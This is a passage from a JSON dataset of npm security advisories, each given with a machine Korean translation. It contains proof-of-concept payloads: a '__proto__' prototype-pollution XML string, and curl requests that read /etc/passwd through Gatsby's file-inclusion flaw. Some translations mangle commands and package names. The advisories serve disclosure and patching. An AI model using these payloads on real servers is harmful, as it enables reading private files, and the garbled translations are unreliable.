    "descriptionKR": "### 영향\n\n`verifyMultiProof`, `verifyMultiProofCalldata`, `processMultiProof` 또는 `processMultiProofCalldata` 함수가 사용 중일 때 임의의 리프 세트에 대해 유효한 다중 증명을 위조할 수 있는 머클 트리를 구성할 수 있습니다.\n\n계약이 검증을 위해 다중 증명을 사용하고 처리되는 머클 트리가 깊이 1(루트 바로 아래)에 값이 0인 노드를 포함하는 경우 계약이 취약할 수 있습니다. 잎이 해시되지 않은 경우 잎이 3개 이하인 균형 잡힌 나무에서 실수로 발생할 수 있습니다. 이는 악의적인 트리 작성기가 트리에 해당 노드를 포함하는 경우 의도적으로 발생할 수 있습니다.\n\n단일 리프 증명(`verify`, `verifyCalldata`, `processProof` 또는 `processProofCalldata`)을 사용하거나 리프가 해시된 알려진 트리로 다중 증명을 사용하는 경우 계약은 취약하지 않습니다. [@openzeppelin/merkle-tree](https://github.com/OpenZeppelin/merkle-tree) 라이브러리로 생성되거나 검증된 표준 머클 트리는 안전합니다.\n\n### 패치\n\n이 문제는 4.9.2에서 패치되었습니다.\n\n### 해결 방법\n\n다중 증명을 사용하는 경우: 머클 트리를 구성할 때 리프를 해시하고 트리에 빈 노드를 삽입하지 마십시오. [@openzeppelin/merkle-tree](https://www.npmjs.com/package/@openzeppelin/merkle-tree) 패키지를 사용하면 이 문제가 해결됩니다. 최소한 트리의 첫 번째 수준을 재구성하지 않고 사용자가 제공한 머클 루트를 수락하지 마십시오. 리프에서 재구성하여 머클 트리 구조를 확인합니다."
  },
  {
    "description": "### Summary\nThere is an open redirect in the `@keystone-6/auth` package, where the redirect leading `/` filter can be bypassed.\n\n### Impact\nUsers may be redirected to domains other than the relative host, thereby it might be used by attackers to re-direct users to an unexpected location.\n\n### Mitigations\n- Don't use the `@keystone-6/auth` package\n\n### References\n- [CWE-601: URL Redirection to Untrusted Site ('Open Redirect')](https://cwe.mitre.org/data/definitions/601.html)\n- [OWASP: Unvalidated Redirects and Forwards Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Unvalidated_Redirects_and_Forwards_Cheat_Sheet.html)\n\n#### Similar Vulnerability Reports\n- [CVE-2023-0748](https://nvd.nist.gov/vuln/detail/CVE-2023-0748)\n- [CVE-2022-2252](https://nvd.nist.gov/vuln/detail/CVE-2022-2252)\n\n#### Credits\nThanks to [morioka12](https://github.com/scgajge12) for reporting this problem.\n\nIf you have any questions around this security advisory, please don't hesitate to contact us at [security@keystonejs.com](mailto:security@keystonejs.com), or [open an issue on GitHub](https://github.com/keystonejs/keystone/issues/new/choose).\n\nIf you have a security flaw to report for any software in this repository, please see our [SECURITY policy](https://github.com/keystonejs/keystone/blob/main/SECURITY.md).\n",
    "identifiers": "GHSA : GHSA-jqxr-vjvv-899m\nCVE : CVE-2023-34247",
    "severity": "MODERATE",
    "updatedAt": "2023-06-14T14:54:06Z",
    "publishedAt": "2023-06-14T14:54:06Z",
    "references": "https://github.com/keystonejs/keystone/security/advisories/GHSA-jqxr-vjvv-899m\nhttps://nvd.nist.gov/vuln/detail/CVE-2023-34247\nhttps://github.com/keystonejs/keystone/pull/8626\nhttps://github.com/advisories/GHSA-jqxr-vjvv-899m",
    "name": "@keystone-6/auth",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "< 7.0.0",
    "identifier": "7.0.0",
    "descriptionKR": "### 요약\n`@keystone-6/auth` 패키지에는 `/` 필터 앞에 있는 리디렉션을 우회할 수 있는 열린 리디렉션이 있습니다.\n\n### 영향\n사용자는 상대 호스트가 아닌 다른 도메인으로 리디렉션될 수 있으므로 공격자가 사용자를 예기치 않은 위치로 리디렉션하는 데 사용할 수 있습니다.\n\n### 완화\n- `@keystone-6/auth` 패키지를 사용하지 마세요.\n\n### 참조\n- [CWE-601: 신뢰할 수 없는 사이트로의 URL 리디렉션('Open Redirect')](https://cwe.mitre.org/data/definitions/601.html)\n- [OWASP: Unvalidated Redirects and Forwards Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Unvalidated_Redirects_and_Forwards_Cheat_Sheet.html)\n\n#### 유사한 취약점 보고서\n- [CVE-2023-0748](https://nvd.nist.gov/vuln/detail/CVE-2023-0748)\n- [CVE-2022-2252](https://nvd.nist.gov/vuln/detail/CVE-2022-2252)\n\n#### 크레딧\n이 문제를 보고해 주신 [morioka12](https://github.com/scgajge12)에게 감사드립니다.\n\n이 보안 권고에 대해 질문이 있는 경우 주저하지 말고 [security@keystonejs.com](mailto:security@keystonejs.com)으로 문의하거나 [GitHub에서 문제 열기](https://github .com/keystonejs/keystone/issues/new/choose).\n\n이 리포지토리의 소프트웨어에 대해 보고할 보안 결함이 있는 경우 [보안 정책](https://github.com/keystonejs/keystone/blob/main/SECURITY.md)을 참조하세요."
  },
  {
    "description": "The crypto-js package before 3.2.1 for Node.js generates random numbers by concatenating the string \"0.\" with an integer, which makes the output more predictable than necessary.",
    "identifiers": "GHSA : GHSA-3w3w-pxmm-2w2j\nCVE : CVE-2020-36732",
    "severity": "MODERATE",
    "updatedAt": "2023-07-06T21:40:08Z",
    "publishedAt": "2023-06-12T03:30:17Z",
    "references": "https://nvd.nist.gov/vuln/detail/CVE-2020-36732\nhttps://github.com/brix/crypto-js/issues/254\nhttps://github.com/brix/crypto-js/issues/256\nhttps://github.com/brix/crypto-js/pull/257/commits/e4ac157d8b75b962d6538fc0b996e5d4d5a9466b\nhttps://github.com/brix/crypto-js/compare/3.2.0...3.2.1\nhttps://security.snyk.io/vuln/SNYK-JS-CRYPTOJS-548472\nhttps://github.com/brix/crypto-js/commit/e4ac157d8b75b962d6538fc0b996e5d4d5a9466b\nhttps://security.netapp.com/advisory/ntap-20230706-0003/\nhttps://github.com/advisories/GHSA-3w3w-pxmm-2w2j",
    "name": "crypto-js",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "< 3.2.1",
    "identifier": "3.2.1",
    "descriptionKR": "Node.js용 3.2.1 이전의 crypto-js 패키지는 문자열 \"0\"을 연결하여 난수를 생성합니다. 출력을 필요 이상으로 예측 가능하게 만드는 정수를 사용합니다."
  },
  {
    "description": "### Impact\nAs a part of this vulnerability, user was able to se code using `__proto__` as a tag or attribute name.\n\n```js\nconst { XMLParser, XMLBuilder, XMLValidator} = require(\"fast-xml-parser\");\n\nlet XMLdata = \"<__proto__><polluted>hacked</polluted></__proto__>\"\n\nconst parser = new XMLParser();\nlet jObj = parser.parse(XMLdata);\n\nconsole.log(jObj.polluted) // should return hacked\n``` \n\n### Patches\nThe problem has been patched in v4.1.2\n\n### Workarounds\nUser can check for \"__proto__\" in the XML string before parsing it to the parser.\n\n### References\nhttps://gist.github.com/Sudistark/a5a45bd0804d522a1392cb5023aa7ef7\n",
    "identifiers": "GHSA : GHSA-x3cc-x39p-42qx\nCVE : CVE-2023-26920",
    "severity": "HIGH",
    "updatedAt": "2023-06-13T12:44:35Z",
    "publishedAt": "2023-06-13T12:44:34Z",
    "references": "https://github.com/NaturalIntelligence/fast-xml-parser/security/advisories/GHSA-x3cc-x39p-42qx\nhttps://github.com/NaturalIntelligence/fast-xml-parser/commit/2b032a4f799c63d83991e4f992f1c68e4dd05804\nhttps://gist.github.com/Sudistark/a5a45bd0804d522a1392cb5023aa7ef7\nhttps://github.com/advisories/GHSA-x3cc-x39p-42qx",
    "name": "fast-xml-parser",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "< 4.1.2",
    "identifier": "4.1.2",
    "descriptionKR": "### 영향\n이 취약점의 일부로 사용자는 `__proto__`를 태그 또는 속성 이름으로 사용하여 코드를 분리할 수 있었습니다.\n\n```js\nconst { XMLParser, XMLBuilder, XMLValidator} = require(\"fast-xml-parser\");\n\nlet XMLdata = \"<__proto__><polluted>해킹됨</polluted></__proto__>\"\n\nconst parser = new XMLParser();\nlet jObj = parser.parse(XMLdata);\n\nconsole.log(jObj.polluted) // 해킹을 반환해야 함\n```\n\n### 패치\n문제는 v4.1.2에서 패치되었습니다.\n\n### 해결 방법\n사용자는 파서로 구문 분석하기 전에 XML 문자열에서 \"__proto__\"를 확인할 수 있습니다.\n\n### 참조\nhttps://gist.github.com/Sudistark/a5a45bd0804d522a1392cb5023aa7ef7"
  },
  {
    "description": "A vulnerability has been found in Starcounter-Jack JSON-Patch up to 3.1.0 and classified as problematic. This vulnerability affects unknown code. The manipulation leads to improperly controlled modification of object prototype attributes ('prototype pollution'). The attack can be initiated remotely. The exploit has been disclosed to the public and may be used. Upgrading to version 3.1.1 can address this issue. The name of the patch is 7ad6af41eabb2d799f698740a91284d762c955c9. It is recommended to upgrade the affected component. VDB-216778 is the identifier assigned to this vulnerability.",
    "identifiers": "GHSA : GHSA-8gh8-hqwg-xf34\nCVE : CVE-2021-4279",
    "severity": "HIGH",
    "updatedAt": "2023-06-12T23:48:12Z",
    "publishedAt": "2022-12-25T21:30:22Z",
    "references": "https://nvd.nist.gov/vuln/detail/CVE-2021-4279\nhttps://github.com/Starcounter-Jack/JSON-Patch/pull/262\nhttps://github.com/Starcounter-Jack/JSON-Patch/commit/7ad6af41eabb2d799f698740a91284d762c955c9\nhttps://github.com/Starcounter-Jack/JSON-Patch/releases/tag/3.1.1\nhttps://blog.effectrenan.com/pwn2win-2021-illusion-web-challenge/\nhttps://www.huntr.dev/bounties/1-npm-fast-json-patch/\nhttps://github.com/advisories/GHSA-8gh8-hqwg-xf34",
    "name": "fast-json-patch",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "< 3.1.1",
    "identifier": "3.1.1",
    "descriptionKR": "Starcounter-Jack JSON-Patch 3.1.0까지 취약점이 발견되어 문제가 있는 것으로 분류되었습니다. 이 취약점은 알 수 없는 코드에 영향을 미칩니다. 조작은 개체 프로토타입 속성의 부적절하게 제어된 수정으로 이어집니다('프로토타입 오염'). 공격은 원격으로 시작할 수 있습니다. 익스플로잇은 대중에게 공개되었으며 사용될 수 있습니다. 버전 3.1.1로 업그레이드하면 이 문제를 해결할 수 있습니다. 패치 이름은 7ad6af41eabb2d799f698740a91284d762c955c9입니다. 영향을 받는 구성 요소를 업그레이드하는 것이 좋습니다. VDB-216778은 이 취약점에 할당된 식별자입니다."
  },
  {
    "description": "All versions of the package progressbar.js are vulnerable to Prototype Pollution via the function extend() in the file utils.js.\n\n",
    "identifiers": "GHSA : GHSA-89qm-hm2x-mxm3\nCVE : CVE-2023-26133",
    "severity": "HIGH",
    "updatedAt": "2023-06-12T18:53:33Z",
    "publishedAt": "2023-06-12T06:30:17Z",
    "references": "https://nvd.nist.gov/vuln/detail/CVE-2023-26133\nhttps://security.snyk.io/vuln/SNYK-JS-PROGRESSBARJS-3184152\nhttps://github.com/kimmobrunfeldt/progressbar.js/blob/74536b9eeeaaf51144706d918ed5a0a679631d96/src/utils.js#L18\nhttps://github.com/kimmobrunfeldt/progressbar.js/blob/74536b9eeeaaf51144706d918ed5a0a679631d96/src/utils.js#L20\nhttps://github.com/advisories/GHSA-89qm-hm2x-mxm3",
    "name": "progressbar.js",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "<= 1.1.0",
    "descriptionKR": "Progressbar.js 패키지의 모든 버전은 utils.js 파일의 extend() 함수를 통한 Prototype Pollution에 취약합니다."
  },
  {
    "description": "### Summary\nThe `cuid` package used by `@keystone-6/*` and upstream dependencies is deprecated and [marked as insecure by the author](https://github.com/paralleldrive/cuid#status-deprecated-due-to-security-use-cuid2-instead).\n\nAs reported by the author\n> Cuid and other k-sortable and non-cryptographic ids (Ulid, ObjectId, KSUID, all UUIDs) are all insecure. Use @paralleldrive/cuid2 instead.\n\n### What are doing about this?\n- [We are waiting on Prisma](https://github.com/keystonejs/keystone/issues/8282) to add support for [`cuid2`](https://github.com/paralleldrive/cuid2)\n- Alternatively, we might default to a random string ourselves\n\n### What can I do about this?\nWe have added a work-around for users who want to provide custom identifiers in https://github.com/keystonejs/keystone/pull/8645\n\n### What if I need a `cuid`?\nThe features marked as a security vulnerability by @paralleldrive are sometimes actually needed ([as written in the README of `cuid`](https://github.com/paralleldrive/cuid#motivation)) - the problem is the inherent risks that features like this can have.\n\nYou might actually want the features of a monotonically increasing (auto-increment, k-sortable), and timestamp-based id as part of your application, and keystone should support that - but you might not want them by _default_.\nThis is why this security advisory has been accepted by me (@dcousens), we currently use cuid identifiers by default, and that should change.\n\n### Impact\nI have accepted this security advisory on the basis that we don't need this kind of identifier typically, and the need for them should be driven by an application's requirements, not a convenient default.\n",
    "identifiers": "GHSA : GHSA-5fp6-4xw3-xqq3",
    "severity": "LOW",
    "updatedAt": "2023-06-23T13:56:30Z",
    "publishedAt": "2023-06-12T18:37:31Z",
    "references": "https://github.com/keystonejs/keystone/security/advisories/GHSA-5fp6-4xw3-xqq3\nhttps://github.com/keystonejs/keystone/issues/8282#issuecomment-1586019823\nhttps://github.com/paralleldrive/cuid#status-deprecated-due-to-security-use-cuid2-instead\nhttps://github.com/advisories/GHSA-5fp6-4xw3-xqq3",
    "name": "@keystone-6/core",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "<= 5.3.1",
    "descriptionKR": "### 요약\n`@keystone-6/*` 및 업스트림 종속성에서 사용하는 `cuid` 패키지는 더 이상 사용되지 않으며 [작성자가 안전하지 않은 것으로 표시](https://github.com/paralleldrive/cuid#status-deprecated-due-to- 보안-사용-cuid2-대신).\n\n저자가보고 한대로\n> Cuid 및 기타 k-정렬 가능 및 비암호화 ID(Ulid, ObjectId, KSUID, 모든 UUID)는 모두 안전하지 않습니다. 대신 @paralleldrive/cuid2를 사용하십시오.\n\n### 이것에 대해 무엇을 하고 있습니까?\n- [Prisma](https://github.com/keystonejs/keystone/issues/8282)에서 [`cuid2`](https://github.com/paralleldrive/cuid2)에 대한 지원을 추가하기를 기다리고 있습니다.\n- 또는 임의의 문자열을 기본값으로 사용할 수 있습니다.\n\n### 어떻게 해야 하나요?\nhttps://github.com/keystonejs/keystone/pull/8645에서 사용자 지정 식별자를 제공하려는 사용자를 위한 해결 방법을 추가했습니다.\n\n### `cuid`가 필요한 경우 어떻게 해야 하나요?\n@paralleldrive에 의해 보안 취약점으로 표시된 기능은 때때로 실제로 필요합니다([`cuid`의 README에 기록됨](https://github.com/paralleldrive/cuid#motivation)) - 문제는 내재된 위험입니다. 이와 같은 기능을 가질 수 있습니다.\n\n애플리케이션의 일부로 단조 증가(자동 증분, k-정렬 가능) 및 타임스탬프 기반 id의 기능을 실제로 원할 수 있으며 keystone이 이를 지원해야 하지만 _default_에서는 원하지 않을 수 있습니다.\n이것이 바로 저(@dcousens)가 이 보안 권고를 수락한 이유이며, 현재 기본적으로 cuid 식별자를 사용하고 있으며 이는 변경되어야 합니다.\n\n### 영향\n저는 일반적으로 이러한 종류의 식별자가 필요하지 않으며 이러한 식별자의 필요성은 편리한 기본값이 아니라 애플리케이션의 요구 사항에 따라 결정되어야 한다는 점을 기반으로 이 보안 권고를 수락했습니다."
  },
  {
    "description": "Versions of the package dottie before 2.0.4 are vulnerable to Prototype Pollution due to insufficient checks, via the `set()` function and the current variable in the `/dottie.js` file.",
    "identifiers": "GHSA : GHSA-4gxf-g5gf-22h4\nCVE : CVE-2023-26132",
    "severity": "HIGH",
    "updatedAt": "2023-06-12T18:34:40Z",
    "publishedAt": "2023-06-10T06:30:25Z",
    "references": "https://nvd.nist.gov/vuln/detail/CVE-2023-26132\nhttps://github.com/mickhansen/dottie.js/commit/7d3aee1c9c3c842720506e131de7e181e5c8db68\nhttps://security.snyk.io/vuln/SNYK-JS-DOTTIE-3332763\nhttps://github.com/mickhansen/dottie.js/blob/b48e22714aae4489ea6276452f22cc61980ba5a4/dottie.js#L107\nhttps://github.com/advisories/GHSA-4gxf-g5gf-22h4",
    "name": "dottie",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "< 2.0.4",
    "identifier": "2.0.4",
    "descriptionKR": "패키지 dottie 2.0.4 이전 버전은 `set()` 함수와 `/dottie.js` 파일의 현재 변수를 통한 불충분한 검사로 인해 Prototype Pollution에 취약합니다."
  },
  {
    "description": "### Issue\nSnowflake was informed via our bug bounty program of a command injection vulnerability in the Snowflake NodeJS driver via SSO browser URL authentication.\n\n### Impacted driver package: \nsnowflake-connector-nodejs\n\n### Impacted version range: \nbefore [Version 1.6.21](https://community.snowflake.com/s/article/Node-js-Driver-Release-Notes) \n\n### Attack Scenario\nIn order to exploit the potential for command injection, an attacker would need to be successful in (1) establishing a malicious resource and (2) redirecting users to utilize the resource. The attacker could set up a malicious, publicly accessible server which responds to the SSO URL with an attack payload. If the attacker then tricked a user into visiting the maliciously crafted connection URL, the user’s local machine would render the malicious payload, leading to a remote code execution. \n\nThis attack scenario can be mitigated through URL whitelisting as well as common anti-phishing resources.  \n\n### Solution\nOn April 18, 2023, Snowflake merged a patch that fixed a command injection vulnerability in the Snowflake NodeJS driver via SSO browser URL authentication. The vulnerability affected the Snowflake NodeJS driver before Version 1.6.21. We strongly recommend users upgrade to Version 1.6.21 as soon as possible via the following resources: [Snowflake NodeJS Driver](https://docs.snowflake.com/en/developer-guide/node-js/nodejs-driver)\n\n### Additional Information\nIf you discover a security vulnerability in one of our products or websites, please report the issue to HackerOne. For more information, please see our [Vulnerability Disclosure Policy](https://hackerone.com/snowflake?type=team).",
    "identifiers": "GHSA : GHSA-h53w-7qw7-vh5c\nCVE : CVE-2023-34232",
    "severity": "HIGH",
    "updatedAt": "2023-06-09T22:53:54Z",
    "publishedAt": "2023-06-09T22:53:51Z",
    "references": "https://github.com/snowflakedb/snowflake-connector-nodejs/security/advisories/GHSA-h53w-7qw7-vh5c\nhttps://nvd.nist.gov/vuln/detail/CVE-2023-34232\nhttps://github.com/snowflakedb/snowflake-connector-nodejs/pull/465\nhttps://github.com/snowflakedb/snowflake-connector-nodejs/commit/0c9622ae12cd7d627df404b73a783b4a5f60728a\nhttps://community.snowflake.com/s/article/Node-js-Driver-Release-Notes\nhttps://github.com/advisories/GHSA-h53w-7qw7-vh5c",
    "name": "snowflake-sdk",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "< 1.6.21",
    "identifier": "1.6.21",
    "descriptionKR": "### 문제\nSnowflake는 SSO 브라우저 URL 인증을 통해 Snowflake NodeJS 드라이버의 명령 주입 취약점에 대한 버그 바운티 프로그램을 통해 정보를 받았습니다.\n\n### 영향을 받는 드라이버 패키지:\n눈송이-커넥터-nodejs\n\n### 영향을 받는 버전 범위:\n[버전 1.6.21](https://community.snowflake.com/s/article/Node-js-Driver-Release-Notes) 이전\n\n### 공격 시나리오\n명령 주입의 가능성을 악용하기 위해 공격자는 (1) 악의적인 리소스를 설정하고 (2) 리소스를 활용하도록 사용자를 리디렉션하는 데 성공해야 합니다. 공격자는 공격 페이로드로 SSO URL에 응답하는 공개적으로 액세스 가능한 악의적인 서버를 설정할 수 있습니다. 그런 다음 공격자가 사용자를 속여 악의적으로 제작된 연결 URL을 방문하도록 유도하면 사용자의 로컬 시스템이 악성 페이로드를 렌더링하여 원격 코드 실행으로 이어집니다.\n\n이 공격 시나리오는 URL 화이트리스트와 일반적인 피싱 방지 리소스를 통해 완화할 수 있습니다.\n\n### 해결책\n2023년 4월 18일, Snowflake는 SSO 브라우저 URL 인증을 통해 Snowflake NodeJS 드라이버의 명령 주입 취약성을 수정하는 패치를 병합했습니다. 이 취약점은 버전 1.6.21 이전의 Snowflake NodeJS 드라이버에 영향을 미쳤습니다. 다음 리소스를 통해 가능한 한 빨리 버전 1.6.21로 업그레이드하는 것이 좋습니다. [Snowflake NodeJS 드라이버](https://docs.snowflake.com/en/developer-guide/node-js/nodejs-driver)\n\n### 추가 정보\n당사 제품 또는 웹사이트 중 하나에서 보안 취약점을 발견하면 HackerOne에 문제를 보고하십시오. 자세한 내용은 [취약점 공개 정책](https://hackerone.com/snowflake?type=team)을 참조하세요."
  },
  {
    "description": "### Impact\n\nThe Gatsby framework prior to versions 4.25.7 and 5.9.1 contain a Local File Inclusion vulnerability in the `__file-code-frame` and `__original-stack-frame` paths, exposed when running the Gatsby develop server (`gatsby develop`).\n\nThe following steps can be used to reproduce the vulnerability:\n\n```\n# Create a new Gatsby project\n$ npm init gatsby\n$ cd my-gatsby-site\n\n# Start the Gatsby develop server\n$ gatsby develop\n\n# Execute the Local File Inclusion vulnerability in __file-code-frame\n$ curl \"http://127.0.0.1:8000/__file-code-frame?filePath=/etc/passwd&lineNumber=1\"\n\n# Execute the Local File Inclusion vulnerability in __original-stack-frame\n$ curl \"http://127.0.0.1:8000/__original-stack-frame?moduleId=/etc/hosts&lineNumber=1&skipSourceMap=1\"\n```\n\nIt should be noted that by default `gatsby develop` is only accessible via the localhost `127.0.0.1`, and one would need to intentionally expose the server to other interfaces to exploit this vulnerability by using server options such as `--host 0.0.0.0`, `-H 0.0.0.0`, or the `GATSBY_HOST=0.0.0.0` environment variable.\n\n\n### Patches\n\nA patch has been introduced in `gatsby@5.9.1` and `gatsby@4.25.7` which mitigates the issue.\n\n\n### Workarounds\n\nAs stated above, by default `gatsby develop` is only exposed to the localhost `127.0.0.1`.  For those using the develop server in the default configuration no risk is posed.  If other ranges are required, preventing the develop server from being exposed to untrusted interfaces or IP address ranges would mitigate the risk from this vulnerability.\n\nWe encourage projects to upgrade to the latest major release branch for all Gatsby plugins to ensure the latest security updates and bug fixes are received in a timely manner.\n\n\n### Credits\n\nWe would like to thank Maxwell Garrett of Assetnote for bringing the `__file-code-frame` issue to our attention.\n\n\n### For more information\n\nEmail us at [security@gatsbyjs.com](mailto:security@gatsbyjs.com).",
    "identifiers": "GHSA : GHSA-c6f8-8r25-c4gc\nCVE : CVE-2023-34238",
    "severity": "MODERATE",
    "updatedAt": "2023-06-09T22:52:04Z",
    "publishedAt": "2023-06-09T22:52:01Z",
    "references": "https://github.com/gatsbyjs/gatsby/security/advisories/GHSA-c6f8-8r25-c4gc\nhttps://nvd.nist.gov/vuln/detail/CVE-2023-34238\nhttps://github.com/gatsbyjs/gatsby/commit/ae5a654eb346b2e7a9d341b809b2f82d34c0f17c\nhttps://github.com/gatsbyjs/gatsby/commit/fc22f4ba3ad7ca5fb3592f38f4f0ca8ae60b4bf7\nhttps://github.com/advisories/GHSA-c6f8-8r25-c4gc",
    "name": "gatsby",
    "ecosystem": "NPM",
    "vulnerableVersionRange": ">= 5.0.0, <= 5.9.0",
    "identifier": "5.9.1",
    "descriptionKR": "### 영향\n\n버전 4.25.7 및 5.9.1 이전의 Gatsby 프레임워크에는 `__file-code-frame` 및 `__original-stack-frame` 경로에 로컬 파일 포함 취약점이 포함되어 있으며 Gatsby 개발 서버(`gatsby dev` ).\n\n다음 단계를 사용하여 취약점을 재현할 수 있습니다.\n\n```\n# 새로운 Gatsby 프로젝트 생성\n$ npm 초기화 개츠비\n$ cd 내-개츠비-사이트\n\n# Gatsby 개발 서버 시작\n$ 개츠비 개발\n\n# __file-code-frame에서 Local File Inclusion 취약점 실행\n$ curl \"http://127.0.0.1:8000/__file-code-frame?filePath=/etc/passwd&lineNumber=1\"\n\n# __original-stack-frame에서 Local File Inclusion 취약점 실행\n$ curl \"http://127.0.0.1:8000/__original-stack-frame?moduleId=/etc/hosts&lineNumber=1&skipSourceMap=1\"\n```\n\n기본적으로 `gatsby dev`는 로컬 호스트 `127.0.0.1`을 통해서만 액세스할 수 있으며 `--host 0.0'과 같은 서버 옵션을 사용하여 이 취약점을 악용하려면 의도적으로 서버를 다른 인터페이스에 노출해야 합니다. .0.0`, `-H 0.0.0.0` 또는 `GATSBY_HOST=0.0.0.0` 환경 변수.\n\n\n### 패치\n\n문제를 완화하는 패치가 `gatsby@5.9.1` 및 `gatsby@4.25.7`에 도입되었습니다.\n\n\n### 해결 방법\n\n위에서 언급했듯이 기본적으로 `gatsby dev`는 로컬 호스트인 `127.0.0.1`에만 노출됩니다. 기본 구성에서 개발 서버를 사용하는 사용자에게는 위험이 없습니다. 다른 범위가 필요한 경우 개발 서버가 신뢰할 수 없는 인터페이스 또는 IP 주소 범위에 노출되지 않도록 하면 이 취약점으로 인한 위험이 완화됩니다.\n\n최신 보안 업데이트 및 버그 수정을 적시에 받을 수 있도록 모든 Gatsby 플러그인의 최신 주요 릴리스 브랜치로 프로젝트를 업그레이드하는 것이 좋습니다.\n\n\n### 크레딧\n\n`__file-code-frame` 문제를 알려준 Assetnote의 Maxwell Garrett에게 감사드립니다.\n\n\n### 자세한 내용은\n\n[security@gatsbyjs.com](mailto:security@gatsbyjs.com)으로 이메일을 보내주세요."
  },
  {
    "description": "### Impact\n\nThe Gatsby framework prior to versions 4.25.7 and 5.9.1 contain a Local File Inclusion vulnerability in the `__file-code-frame` and `__original-stack-frame` paths, exposed when running the Gatsby develop server (`gatsby develop`).\n\nThe following steps can be used to reproduce the vulnerability:\n\n```\n# Create a new Gatsby project\n$ npm init gatsby\n$ cd my-gatsby-site\n\n# Start the Gatsby develop server\n$ gatsby develop\n\n# Execute the Local File Inclusion vulnerability in __file-code-frame\n$ curl \"http://127.0.0.1:8000/__file-code-frame?filePath=/etc/passwd&lineNumber=1\"\n\n# Execute the Local File Inclusion vulnerability in __original-stack-frame\n$ curl \"http://127.0.0.1:8000/__original-stack-frame?moduleId=/etc/hosts&lineNumber=1&skipSourceMap=1\"\n```\n\nIt should be noted that by default `gatsby develop` is only accessible via the localhost `127.0.0.1`, and one would need to intentionally expose the server to other interfaces to exploit this vulnerability by using server options such as `--host 0.0.0.0`, `-H 0.0.0.0`, or the `GATSBY_HOST=0.0.0.0` environment variable.\n\n\n### Patches\n\nA patch has been introduced in `gatsby@5.9.1` and `gatsby@4.25.7` which mitigates the issue.\n\n\n### Workarounds\n\nAs stated above, by default `gatsby develop` is only exposed to the localhost `127.0.0.1`.  For those using the develop server in the default configuration no risk is posed.  If other ranges are required, preventing the develop server from being exposed to untrusted interfaces or IP address ranges would mitigate the risk from this vulnerability.\n\nWe encourage projects to upgrade to the latest major release branch for all Gatsby plugins to ensure the latest security updates and bug fixes are received in a timely manner.\n\n\n### Credits\n\nWe would like to thank Maxwell Garrett of Assetnote for bringing the `__file-code-frame` issue to our attention.\n\n\n### For more information\n\nEmail us at [security@gatsbyjs.com](mailto:security@gatsbyjs.com).",
    "identifiers": "GHSA : GHSA-c6f8-8r25-c4gc\nCVE : CVE-2023-34238",
    "severity": "MODERATE",
    "updatedAt": "2023-06-09T22:52:04Z",
    "publishedAt": "2023-06-09T22:52:01Z",
    "references": "https://github.com/gatsbyjs/gatsby/security/advisories/GHSA-c6f8-8r25-c4gc\nhttps://nvd.nist.gov/vuln/detail/CVE-2023-34238\nhttps://github.com/gatsbyjs/gatsby/commit/ae5a654eb346b2e7a9d341b809b2f82d34c0f17c\nhttps://github.com/gatsbyjs/gatsby/commit/fc22f4ba3ad7ca5fb3592f38f4f0ca8ae60b4bf7\nhttps://github.com/advisories/GHSA-c6f8-8r25-c4gc",
    "name": "gatsby",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "<= 4.25.6",
    "identifier": "4.25.7",
    "descriptionKR": "### 영향\n\n버전 4.25.7 및 5.9.1 이전의 Gatsby 프레임워크에는 `__file-code-frame` 및 `__original-stack-frame` 경로에 로컬 파일 포함 취약점이 포함되어 있으며 Gatsby 개발 서버(`gatsby dev` ).\n\n다음 단계를 사용하여 취약점을 재현할 수 있습니다.\n\n```\n# 새로운 Gatsby 프로젝트 생성\n$ npm 초기화 개츠비\n$ cd 내-개츠비-사이트\n\n# Gatsby 개발 서버 시작\n$ 개츠비 개발\n\n# __file-code-frame에서 Local File Inclusion 취약점 실행\n$ curl \"http://127.0.0.1:8000/__file-code-frame?filePath=/etc/passwd&lineNumber=1\"\n\n# __original-stack-frame에서 Local File Inclusion 취약점 실행\n$ curl \"http://127.0.0.1:8000/__original-stack-frame?moduleId=/etc/hosts&lineNumber=1&skipSourceMap=1\"\n```\n\n기본적으로 `gatsby dev`는 로컬 호스트 `127.0.0.1`을 통해서만 액세스할 수 있으며 `--host 0.0'과 같은 서버 옵션을 사용하여 이 취약점을 악용하려면 의도적으로 서버를 다른 인터페이스에 노출해야 합니다. .0.0`, `-H 0.0.0.0` 또는 `GATSBY_HOST=0.0.0.0` 환경 변수.\n\n\n### 패치\n\n문제를 완화하는 패치가 `gatsby@5.9.1` 및 `gatsby@4.25.7`에 도입되었습니다.\n\n\n### 해결 방법\n\n위에서 언급했듯이 기본적으로 `gatsby dev`는 로컬 호스트인 `127.0.0.1`에만 노출됩니다. 기본 구성에서 개발 서버를 사용하는 사용자에게는 위험이 없습니다. 다른 범위가 필요한 경우 개발 서버가 신뢰할 수 없는 인터페이스 또는 IP 주소 범위에 노출되지 않도록 하면 이 취약점으로 인한 위험이 완화됩니다.\n\n최신 보안 업데이트 및 버그 수정을 적시에 받을 수 있도록 모든 Gatsby 플러그인의 최신 주요 릴리스 브랜치로 프로젝트를 업그레이드하는 것이 좋습니다.\n\n\n### 크레딧\n\n`__file-code-frame` 문제를 알려준 Assetnote의 Maxwell Garrett에게 감사드립니다.\n\n\n### 자세한 내용은\n\n[security@gatsbyjs.com](mailto:security@gatsbyjs.com)으로 이메일을 보내주세요."
  },
  {
    "description": "### Impact\nAffected versions of the link plugin and link UI component do not sanitize URLs to prevent use of the `javascript:` scheme. As a result, links with JavaScript URLs can be inserted into the Plate editor through various means, including opening or pasting malicious content.\n\n### Patches\n`@udecode/plate-link` 20.0.0 resolves this issue by introducing an `allowedSchemes` option to the link plugin, defaulting to `['http', 'https', 'mailto', 'tel']`. URLs using a scheme that isn't in this list will not be rendered to the DOM.\n\n### Workarounds\nIf you are unable to update `@udecode/plate-link` to version 20.0.0, we recommend overriding the `LinkElement` and `PlateFloatingLink` components with implementations that explicitly check the URL scheme before rendering any anchor elements.\n",
    "identifiers": "GHSA : GHSA-4882-hxpr-hrvm\nCVE : CVE-2023-34245",
    "severity": "HIGH",
